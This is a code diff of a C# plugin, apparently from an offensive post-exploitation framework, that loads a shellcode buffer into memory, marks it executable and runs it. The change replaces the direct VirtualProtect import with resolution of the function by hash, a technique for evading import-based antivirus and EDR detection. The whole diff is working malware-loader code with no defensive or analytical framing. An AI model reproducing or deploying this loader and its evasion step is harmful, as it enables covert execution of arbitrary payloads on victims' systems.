@@ -24,8 +24,9 @@ namespace Plugin
             PAGE_NOCACHE = 0x00000200,
             PAGE_WRITECOMBINE = 0x00000400
         }
-        [DllImport("kernel32.dll")]
-        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect); 
+        const long VirtPro = 65467780416196;
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        public delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
         public static ResponseResult Execute(Dictionary<string, object> args)
         {
@@ -41,9 +42,14 @@ namespace Plugin
                     fixed (byte* ptr = buffer)
                     {
                         IntPtr pAddr = (IntPtr)ptr;
-                        VirtualProtect(pAddr, (UIntPtr)buffer.Length, MemoryProtection.PAGE_EXECUTE_READ, out MemoryProtection lpfOldProtect);
-                        BufferDelegate f = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(pAddr, typeof(BufferDelegate));
-                        f();
+                        uint lpfOldProtect = 0;
+                        IntPtr ptrVP = HInvoke.GetfuncaddressbyHash("kernel32.dll", VirtPro); //Get Pointer for VirtualProtect function
+                        VPDelegate ptrVPD = (VPDelegate)Marshal.GetDelegateForFunctionPointer(ptrVP, typeof(VPDelegate)); //Create VirtualProtect Delegate
+                        ptrVPD(pAddr, (UIntPtr)buffer.Length, 0x00000020, out lpfOldProtect); //Call Virtual Protect
+                        
+                        BufferDelegate f = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(pAddr, typeof(BufferDelegate)); //Create delegate for our sc buffer
+                        
+                        f(); //Execute buffer
                     }
                 }
             });
